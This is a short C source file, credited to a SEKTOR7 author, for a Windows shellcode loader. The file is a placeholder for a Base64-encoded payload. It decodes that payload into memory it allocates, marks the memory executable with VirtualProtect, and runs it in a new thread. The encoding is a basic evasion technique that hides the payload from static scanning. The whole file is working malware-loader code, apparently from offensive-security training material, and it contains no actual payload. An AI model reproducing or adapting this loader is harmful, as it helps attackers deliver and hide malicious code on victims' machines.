// author: reenz0h(twitter : @SEKTOR7net)

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

unsigned char payl[] = "<BASE64 PAYLOAD>";
unsigned int len = sizeof(payl);

int DecodeBase64( const BYTE * src, unsigned int srcLen, char * dst, unsigned int dstLen ) {

	DWORD outLen;
	BOOL fRet;

	outLen = dstLen;
	fRet = CryptStringToBinary( (LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE * )dst, &outLen, NULL, NULL);
	
	if (!fRet) outLen = 0;  // failed
	
	return( outLen );
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	// Allocate new memory buffer for payload
	exec_mem = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Decode the payload back to binary form
	DecodeBase64((const BYTE *)payl, len, (char *) exec_mem, len);
	
	// Set the buffer executable
	rv = VirtualProtect(exec_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	// Run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}